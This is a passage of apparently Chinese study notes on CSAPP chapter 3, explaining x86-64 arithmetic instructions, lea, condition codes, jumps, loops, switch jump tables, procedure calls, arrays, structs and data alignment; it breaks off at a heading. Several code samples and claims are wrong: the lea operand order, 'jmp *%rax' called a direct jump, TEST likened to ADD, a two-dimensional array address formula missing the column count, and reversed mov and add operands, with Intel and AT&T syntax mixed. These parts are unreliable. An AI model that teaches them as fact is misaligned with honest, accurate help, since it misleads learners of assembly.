title="算数和逻辑操作"></a>算数和逻辑操作</h4><p>之前在第二章中学到过计算机的运算，主要分为算数运算和逻辑运算。</p><p>这些运算操作又被分成四组：加载有效地址、一元操作、二元操作和移位。一元操作就是只有一个操作数，同样的，二元操作就是有两个操作数。在这之下，每一个运算的指令类都有对应的不同大小操作数的变种。</p><p>具体如下表：</p><blockquote><p>一元操作指令</p></blockquote><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>INC D</td><td>自增（D++）</td></tr><tr><td>DEC D</td><td>自减（D–）</td></tr><tr><td>NEG D</td><td>取负（-D）</td></tr><tr><td>NOT D</td><td>取反（~D）</td></tr></tbody></table><blockquote><p>二元操作指令</p></blockquote><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>ADD S, D</td><td>D+ &#x3D; S</td></tr><tr><td>SUB S, D</td><td>D- &#x3D; S</td></tr><tr><td>IMUL S, D</td><td>D* &#x3D; S（有符号）</td></tr><tr><td>MUL S, D</td><td>D* &#x3D; S（无符号）</td></tr><tr><td>IDIV S, D</td><td>D&#x2F; &#x3D; S（有符号）</td></tr><tr><td>DIV S, D</td><td>D&#x2F; &#x3D; S（无符号）</td></tr><tr><td>XOR S, D</td><td>D^ &#x3D; S</td></tr><tr><td>OR S, D</td><td>D| &#x3D; S</td></tr><tr><td>AND S, D</td><td>D&amp; &#x3D; S</td></tr><tr><td>SAL S, D</td><td>D&lt;&lt; &#x3D; S（有符号）</td></tr><tr><td>SAR S, D</td><td>算术右移  D&gt;&gt; &#x3D; S（有符号）</td></tr><tr><td>SHL S, D</td><td>D&lt;&lt; &#x3D; S（无符号）</td></tr><tr><td>SHR S, D</td><td>逻辑右移  D&gt;&gt; &#x3D; S（无符号）</td></tr></tbody></table><h4 id="加载有效地址"><a href="#加载有效地址" class="headerlink" title="加载有效地址"></a>加载有效地址</h4><p><code>leaq(lea)</code> 指令是加载有效地址指令，它实际上就是 movq 的变形。</p><p><code>lea</code> 指令形式是从内存读取数据到寄存器，但实际上它根本既没有引用内存。它的第一个操作数看上去是个内存引用，但该指令并不是从指定的位置读入数据，而是<strong>将有效地址写入目的操作数</strong>。此外，lea 的目的操作数必须是寄存器。</p><p><code>lea</code> 指令有很多灵活的用法，经常用于计算数据，可以实现加法和有限形式的乘法，如下面的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">example</span><span class="hljs-params">(<span class="hljs-type">long</span> x,<span class="hljs-type">long</span> y)</span><br>&#123;<br>    <span class="hljs-comment">//x in %rdi,y in %rsi</span><br>    <span class="hljs-type">long</span> t=x+<span class="hljs-number">4</span>*y;<br>    <span class="hljs-keyword">return</span> t;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果没有 <code>lea</code> 指令，这个函数对应的计算部分的汇编代码可以被写成这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq    %rsi, %rax      # 将y（%rsi）移动到%rax寄存器<br>salq    $2, %rax        # 乘以4（左移2位，相当于乘以4）<br>addq    %rdi, %rax      # 将%rdi添加到%rax<br></code></pre></td></tr></table></figure><p>但我们引用 lea ，汇编代码就被简化了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">leaq (%rdi,4,%rsi),%rax<br></code></pre></td></tr></table></figure><blockquote><p>没错就这一句🤔</p></blockquote><h3 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h3><p>程序中不止会有逐步指令执行的直线代码行为，C语言中的某些结构会要求有条件的执行，比如循环语句，在循环中我们会重复执行多次统一部分的指令。对此，机器提供相应的指令来控制修改机器代码的指令顺序。</p><p>执行方式分为条件执行和非条件执行</p><h4 id="条件码"><a href="#条件码" class="headerlink" title="条件码"></a>条件码</h4><p>除了整数寄存器，CPU还维护着一组单位个的条件码寄存器，用来描述最近的算术或逻辑操作的属性，用来判断并执行条件分支指令。常见的条件码如下：</p><table><thead><tr><th>指令</th><th>作用</th><th>描述</th></tr></thead><tbody><tr><td>CF</td><td>进位标志</td><td>判断是否产生进位</td></tr><tr><td>ZF</td><td>零标志</td><td>判断最近的结果是否为0</td></tr><tr><td>SF</td><td>符号标志</td><td>最近操作的结果是否为负数</td></tr><tr><td>OF</td><td>溢出标志</td><td>最近的操作是否导致补码溢出</td></tr></tbody></table><p>leaq 指令不会改变任何条件码，因为它是用地址进行计算的。除此之外，所有的指令都会设置条件码。同时需要注意，INC 和 DEC 指令不会改变进位标志，CMP 指令和 TEST 指令只改变条件码。</p><blockquote><p>除了对寄存器的操作，CMP指令和SUB指令的行为相同，TEST指令和ADD指令的行为相同</p></blockquote><h4 id="访问条件码"><a href="#访问条件码" class="headerlink" title="访问条件码"></a>访问条件码</h4><p>机器并不是直接去读取条件吗，常用的方法有以下三种：</p><ul><li>根据条件码的某种组合，将一个字节设置为0或1。我们将这类指令称为 SET 指令</li><li>条件跳转到程序的某个其他的部分</li><li>有条件地传送数据</li></ul><p>每一条 SET 指令的后缀都指明了它们所考虑的条件码的组合，需要注意的是后缀表示的是不同的条件而不是不同的操作数。具体的 SET 指令如下表：</p><table><thead><tr><th align="center">指令</th><th align="center">同义后缀</th><th align="center">条件码</th><th align="center">设置条件</th></tr></thead><tbody><tr><td align="center">sete</td><td align="center">z</td><td align="center">ZF&#x3D;&#x3D;1</td><td align="center">相等（零）</td></tr><tr><td align="center">setne</td><td align="center">nz</td><td align="center">ZF&#x3D;&#x3D;0</td><td align="center">不相等（不为零）</td></tr><tr><td align="center">sets</td><td align="center">&#x2F;</td><td align="center">SF&#x3D;&#x3D;1</td><td align="center">负数</td></tr><tr><td align="center">setns</td><td align="center">&#x2F;</td><td align="center">SF&#x3D;&#x3D;0</td><td align="center">非负数</td></tr><tr><td align="center">setg</td><td align="center">nle</td><td align="center">(SF^OF)&#x3D;&#x3D;0&amp;ZF&#x3D;&#x3D;0</td><td align="center">（有符号）大于</td></tr><tr><td align="center">setge</td><td align="center">nl</td><td align="center">(SF^OF)&#x3D;&#x3D;0</td><td align="center">（有符号）大于等于</td></tr><tr><td align="center">setl</td><td align="center">nge</td><td align="center">(SF^OF)&#x3D;&#x3D;1</td><td align="center">（有符号）小于</td></tr><tr><td align="center">setle</td><td align="center">ng</td><td align="center">(SF^OF)&#x3D;&#x3D;1|ZF</td><td align="center">（有符号）小于等于</td></tr><tr><td align="center">seta</td><td align="center">nbe</td><td align="center">CF&#x3D;&#x3D;0&amp;ZF&#x3D;&#x3D;0</td><td align="center">（无符号）大于</td></tr><tr><td align="center">setae</td><td align="center">nb</td><td align="center">CF&#x3D;&#x3D;0</td><td align="center">（无符号）大于等于</td></tr><tr><td align="center">setb</td><td align="center">nae</td><td align="center">CF&#x3D;&#x3D;1</td><td align="center">（无符号）小于</td></tr><tr><td align="center">setbe</td><td align="center">na</td><td align="center">CF|ZF&#x3D;&#x3D;1</td><td align="center">（无符号）小于等于</td></tr></tbody></table><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><p>前面提到机器需要指令来实现指令执行的切换，跳转（jump）指令就会导致执行切换到程序中一个全新的位置。在汇编代码中，这些跳转的目的地通常用一个标号（label）指明。</p><p><code>jmp</code> 指令是无条件跳转，它可以直接跳转，即跳转目标是作为指令的一部分编码，比如 <code>jmp *%rax</code> ；也可以间接跳转，即跳转目标需要从寄存器或内存位置读出，比如 <code>jmp *(%rax)</code> 。</p><p><code>jmp</code> 指令的条件指令就是 <code>j+后缀</code> ，具体后缀和上面 <code>set</code> 后缀部分相同，对应条件也相同。</p><p>跳转指令的目标值是一个地址，它主要有两种编码方式：</p><ul><li>绝对地址：给出绝对地址，用四字节直接指定要跳转到的内存地址。</li><li>相对地址：用偏移量编码，将目标指令的地址与紧跟在跳转指令后面的指令地址之间的差值作为编码，编译器或汇编器会完成这些工作。</li></ul><h4 id="条件分支的实现"><a href="#条件分支的实现" class="headerlink" title="条件分支的实现"></a>条件分支的实现</h4><p>条件分支是编程中常用的一种控制结构，它允许根据条件的成立与否来执行不同的代码路径。条件分支通常可以通过两种主要方法来实现：条件控制和条件传送语句。</p><h5 id="条件控制来实现条件分支"><a href="#条件控制来实现条件分支" class="headerlink" title="条件控制来实现条件分支"></a>条件控制来实现条件分支</h5><p>在条件控制中，程序使用条件语句（如 <code>if</code>、<code>else if</code> 、<code>else</code> ）来检查一个或多个条件表达式，并基于这些条件的真假来选择执行不同的代码块。</p><p>条件控制通常使用分支指令（如条件跳转指令）来实现，例如，在汇编语言中，<code>jz</code>（跳转如果零）、<code>jnz</code>（跳转如果不为零）等指令可用于根据条件跳转到不同的代码段。</p><p>条件控制的一个典型示例是使用 <code>if </code>语句来根据条件执行不同的代码块。比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (x&gt;y) <br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>在汇编代码中我们就可以写成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    cmp rdi, rsi     ; 比较 x 和 y<br>    jg L1      ; 如果 x &gt; y，则跳转到 greater<br>    mov rax, 0      ; 否则，将 0 存储在 %rax 中<br>    jmp done<br>L1:<br>    mov rax, 1      ; 如果 x &gt; y，则将 1 存储在 %rax 中<br>done:<br>    ; 返回结果并退出<br>    ret<br></code></pre></td></tr></table></figure><h5 id="条件传送语句实现条件分支"><a href="#条件传送语句实现条件分支" class="headerlink" title="条件传送语句实现条件分支"></a>条件传送语句实现条件分支</h5><p>条件传送语句是一种通过条件来选择是否将一个值传送到目标寄存器或内存位置的机制，使用数据实现条件转移。它通常用于执行非常简单的条件分支，其中只有两个可能的结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (x&gt;y) <br>&#123;<br>    result=x-y;<br>&#125; <br><span class="hljs-keyword">else</span><br>&#123;<br>    result=y-x;<br>&#125;<br></code></pre></td></tr></table></figure><p>在汇编代码中我们就可以写成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   movq %rdi,%rax<br>   subq %rsi,%rax          ;let %rax=x-y<br>   movq %rsi,%rbx<br>   subq %rdi,%rbx          ;let %rbx=y-x<br>cmp %rsi,%rdi<br>cmovle %rbx,%rax        ;if x&lt;=y movq %rbx,%rax<br>ret<br></code></pre></td></tr></table></figure><p>注意观察上面的汇编代码，它会先把两种结果都算出来，最后再根据判断结果赋值。虽然这种方法看上去执行的步骤更多，但是实际上它的运行速度更快。</p><h5 id="条件控制和条件传送的比较"><a href="#条件控制和条件传送的比较" class="headerlink" title="条件控制和条件传送的比较"></a>条件控制和条件传送的比较</h5><p>处理器通过流水线来获得高性能，在流水线中，机器会重叠连续指令，比如在执行某一条指令的同时会同时执行它前面一条的算术运算。</p><p>像前面的条件传送语句中，他的计算步骤是同时进行的；但是由于条件控制语句在执行完毕之前，不能确定程序是否要跳转，也就无法知道它接下来要执行的指令，所以我们只能等待条件跳转指令执行完毕再次填充指令流水作业，速度自然就慢了。</p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>C语言中的很多循环例如 do-while 、while 和 for 。汇编中并没有相应的代码来直接实现这些操作，但是可以用条件测试和跳转组合来实现循环的效果。</p><h5 id="do-while"><a href="#do-while" class="headerlink" title="do-while"></a>do-while</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">do</span>&#123;<br><span class="hljs-comment">//bodyment</span><br>i--;<br>&#125;<br><span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>它对应的汇编代码就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq $10,%rcx     <br>do:<br>    ;do bodyment<br>    subq $1,%rcx<br>    test %rcx,%rcx<br>    jns do<br></code></pre></td></tr></table></figure><p>同样，其他的循环也有对应的实现方法</p><h5 id="while"><a href="#while" class="headerlink" title="while"></a>while</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>)<br>&#123;<br>       <span class="hljs-comment">//bodyment</span><br>       i--;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">do:<br>    subq $1,%rcx<br>    test %rcx,%rcx<br>    js end<br>    ;do bodyment<br>    jmp do<br>end:<br>    ret<br></code></pre></td></tr></table></figure><h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>&#123;<br>       <span class="hljs-comment">//bodyment</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq %rcx,0<br>do:<br>    ;something<br>    addq %rcx,$1<br>    cmpq $10,%rcx<br>    jl do<br></code></pre></td></tr></table></figure><p>综上，上方的三个循环都可以用条件分支代码的思路去实现，由控制来构成机器代码。</p><h4 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h4><p><code>switch</code> 语句可以根据一个整数索引值进行多重分支，当开关的情况数量比较多，并且值的跨度范围比较小时，会通过使用<strong>跳转表</strong>来实现程序的高效性。</p><p>跳转表是一个数组或类似数据结构，其中每个 <code>case</code> 标签对应一个表项。每个表项包含两部分信息：条件值和跳转目标。在跳转的判断部分，程序会在跳转表中直接查找 <code>switch </code> 表达式的值对应的条件值，<strong>只进行一次判断</strong>就跳转到指定位置运行。</p><p>比如下面这段C语言代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">switch_eg</span><span class="hljs-params">(n)</span><br>&#123;<br>    <span class="hljs-type">int</span> val=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">switch</span>(n)<br>    &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            val+=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            val-=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            val*=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            val/=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            val--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L1:<br>    .quad .L2<br>    .quad .L3<br>    .quad .L4<br>    .quad .L5<br>    .quad .L6<br><br>switch_eg:<br>    movq $1,%rax<br>    subq $1,%rdi    ;rdi 也就是 n ，其值要匹配跳转表的索引<br>    cmpq $3,%rdi<br>    ja L6<br>    jmp *.L1(,%rdi,8)    ;跳转表<br>L2:<br>    addq $2,%rax<br>    jmp end<br>L3: <br>    subq $2,%rax<br>    jmp end<br>L4:<br>    mul $2,%rax<br>    jmp end<br>L5:<br>    div $2,%rax<br>    jmp end<br>L6:<br>    addq $1,%rax<br>end:<br>    ret<br></code></pre></td></tr></table></figure><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>过程是软件中很重要的抽象，它提供了一种封装代码的方式，用一组参数和可选的返回值实现了某种功能。我们可以在程序中不同的地方调用这个函数。</p><p>我们假设过程 P 调用过程 Q ，Q 执行后返回到 P。</p><h4 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h4><p>C语言过程调用机制的一个关键特性就是使用了栈数据结构提供的后进先出的内存管理原则。</p><p>当某个函数运行时所需要的局部变量超过了寄存器的数量，就会在栈上开辟空间，这个在栈上分配的空间就称为这个函数的栈帧。</p><p>当 P 调用 Q 时，会把 P 的状态保存起来，并存储 Q 调用结束后的返回地址，调用完以后再恢复到调用前的状态。需要注意这个<strong>返回地址属于 P 的帧的一部分</strong>。</p><h4 id="转移控制"><a href="#转移控制" class="headerlink" title="转移控制"></a>转移控制</h4><p>当控制从函数 P 转移到函数 Q 只需要把程序计数器（PC）设置为 Q 的起始地址，但当 Q 调用结束返回 P时，处理器必须记住 P 应该继续执行的代码位置，这个信息就是由 <code>call</code> 指令来记录的。</p><p><code>call Q</code> 指令用来调用 Q ，同时它会将 P 当前的地址 A 压入栈中，并将 PC 设置为 Q 的起始地址。地址 A 就是函数 Q 的返回地址，也是 <code>ret</code> 指令的地址。ret 指令紧跟在 call 指令之后，会从栈中弹出返回地址 A，并把 PC 重新设置为 A ，继续函数 P 的执行。</p><p>call 指令和 ret 指令的一般形式如下：</p><table><thead><tr><th>指令</th><th>描述</th><th>作用</th></tr></thead><tbody><tr><td>call  <em>Label</em></td><td>过程调用</td><td>控制程序跳转到被调用过程的指令地址</td></tr><tr><td>call  *<em>Operand</em></td><td>过程调用</td><td>控制程序跳转到被调用过程的指令地址</td></tr><tr><td>ret</td><td>从过程调用中返回</td><td>控制程序返回到调用它的地方</td></tr></tbody></table><p>这两个指令对应的寄存器层面的变化如下：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6%E5%9C%B0%E5%9D%80.png"></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6%E5%9C%B0%E5%9D%802.png"></p><p>call 指令执行前</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6call%E5%89%8D.png"></p><p>call 指令执行完毕后，<em>rip</em> 寄存器指向调用的函数 <code>foo()</code> 的地址 <code>0x4004e7</code>，此时 <em>rsp</em> 指向返回地址 <code>0x400514</code></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6call%E5%90%8E.png"></p><p>ret 执行后 <em>rip</em> 寄存器指向原本 <code>foo()</code> 函数对应的返回地址 <code>0x400514</code></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6ret%E5%90%8E.png"></p><h4 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h4><p>在函数调用的过程中，不仅要把控制在过程中传递，还需要传递数据参数。</p><p>在 x86-64 中，大部分的过程间的数据传递是通过寄存器实现的。寄存器最多传递六个整数，顺序是： %rdi，%rsi，%rdx，%rcx，%r8，%r9 ，其余参数自右向左依次入栈。</p><h4 id="栈上的局部存储"><a href="#栈上的局部存储" class="headerlink" title="栈上的局部存储"></a>栈上的局部存储</h4><p>有一些局部数据必须放在内存中，具体情况如下：</p><ul><li>寄存器不足以存放所有的本地数据</li><li>对局部变量使用地址运算符 <code>&amp;</code> 进行取地址操作</li><li>变量是数组或结构，必须通过引用来访问</li></ul><h4 id="寄存器中的局部存储空间"><a href="#寄存器中的局部存储空间" class="headerlink" title="寄存器中的局部存储空间"></a>寄存器中的局部存储空间</h4><p>我们知道，寄存器是在整个过程中共享的资源，我们需要保证 在一个过程调用另一个过程时，被调用者不会覆盖调用者将要使用的寄存器的值，以保证调用结束后程序可以正常运行。对此 x86-64 有一组统一的寄存器使用惯例。</p><p> 惯例中：%rbx,%rbp,%r12~%r15 被划分为<strong>被调用者保存寄存器</strong>，就是被调用函数不回去待变这些寄存器的值。而其它的寄存器，除了 %rsp 都分类为<strong>调用者保存寄存器</strong>，也就是任何函数都可以改变它们。</p><p>我们可以这样理解“调用者保存”这个名字，Q 被调用时可以随意改变这些寄存器，那么保存好这些数据就是调用者 P 的责任。</p><h3 id="数组的分配和访问"><a href="#数组的分配和访问" class="headerlink" title="数组的分配和访问"></a>数组的分配和访问</h3><p>C语言中的数组是一种将标量数据据继承更大数据类型的方式。</p><h4 id="基本原则"><a href="#基本原则" class="headerlink" title="基本原则"></a>基本原则</h4><p>对于数据类型 T 和整型常数 N，数组声明为 <code>T A[N];</code> ，它的起始位置我们表示为 <em>xA</em> ，数组占用的字节数是 <em>sizeof(T)* N</em> ，我们访问 A[i] ,实际上就是访问 <em>xA + sizeof(T)* i</em>  。</p><h4 id="指针运算"><a href="#指针运算" class="headerlink" title="指针运算"></a>指针运算</h4><p>C语言允许且对指针进行运算，计算出来的值会根据引用该指针的数据类型的大小进行伸缩。也就是说表达式 p+i  相当于 *xp+sizeof(type)<em>i</em> 的地址（xp 表示数组 p 的基地址）。</p><h4 id="嵌套的数组"><a href="#嵌套的数组" class="headerlink" title="嵌套的数组"></a>嵌套的数组</h4><p>我们使用的二维数组，例如 <code>int A[5][3];</code>，等价于 <code>typedef int row3_t[3]; row3_t A[5]</code>，这种就是嵌套声明。</p><p>我们要访问多维数组 <code>T D[R][C]</code> 的元素 <em>D[i][j]</em>  ，对应的内存地址是 <em>xD+sizeof(T) *i+sizeof(T) *j</em>  。</p><h3 id="异质的数据结构"><a href="#异质的数据结构" class="headerlink" title="异质的数据结构"></a>异质的数据结构</h3><p>C语言提供了两种将不同类型对象结合到一起创建数据类型的机制：结构和联合</p><h4 id="结构（struct"><a href="#结构（struct" class="headerlink" title="结构（struct)"></a>结构（struct)</h4><p><code>struct</code> 也叫结构体，将可能不同类型的基本数据聚和到一个对象当中，用名字来引用结构的各个部分。编译器维护关于每个结构类型的信息，指示每个字段的字节偏移，作为内存引用指令中的位移，用来实现各个元素的引用。</p><p>也就是说，我们想要访问结构体中的某个对象，只需要将结构体的地址再加上这个字段的偏移即可。</p><h4 id="联合（union"><a href="#联合（union" class="headerlink" title="联合（union)"></a>联合（union)</h4><p>联合的声明方式和结构体相同，但不同的是联合内的<strong>所有成员变量共享同一块内存</strong>，只能同时访问一个数据成员，而结构体中的数据成员各自独立的占用内存，所以可以被同时访问。</p><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">U</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> c;<br>    <span class="hljs-type">int</span> i[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">double</span> v;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于 U的指针 <code>p</code> ，<code>p-&gt;c</code> 和<code>p-&gt;i[0]</code>都是指向 U 的起始位置。</p><h4 id="数据对齐"><a href="#数据对齐" class="headerlink" title="数据对齐"></a>数据对齐</h4><p>许多计算系统都对数据类型的合法地址做出了一些限制，要求某些数据对象的地址必须是某个值的倍数。例如处理器总是从内存中取 8 字节，那么有效地址就必须是 8 字节的倍数，这样我们可以保证用一个内存操作来读、写值了。</p><p>例如下面的结构体，如果没有对齐要求，我们认为他们的内存占用情况如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">S</span>&#123;</span><br>    <span class="hljs-type">int</span> i;         <span class="hljs-comment">//+4</span><br>    <span class="hljs-type">char</span> c;        <span class="hljs-comment">//4+=1</span><br>    <span class="hljs-type">int</span> j;        <span class="hljs-comment">//5+=4</span><br>&#125;<br></code></pre></td></tr></table></figure><p>但实际上是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">S</span>&#123;</span><br>    <span class="hljs-type">int</span> i;         <span class="hljs-comment">//+4</span><br>    <span class="hljs-type">char</span> c;        <span class="hljs-comment">//4+=1</span><br>    <span class="hljs-type">int</span> j;        <span class="hljs-comment">//8+=4</span><br>&#125;<br></code></pre></td></tr></table></figure><p>画出图就是下面的样子，灰色部分是为了对内对齐导致的两个数据成员之间的空的间隙</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90.png"></p><p>因为不同的数据类型都必须对其相应的值K，具体如下表：</p><table><thead><tr><th>K</th><th>类型</th></tr></thead><tbody><tr><td>1</td><td>char</td></tr><tr><td>2</td><td>short</td></tr><tr><td>4</td><td>int , float</td></tr><tr><td>8</td><td>long , double , char*</td></tr></tbody></table><h3 id="在机器级程序中将控制与数据结合起来"><a href="#在机器级程序中将控制与数据结合起来" class="headerlink" title="在机器级程序中将控制与数据结合起来"></a>在机器级程序中将控制与数据结合起来</h3><h4 id="指针"><a href="#指针" class="headerlink" 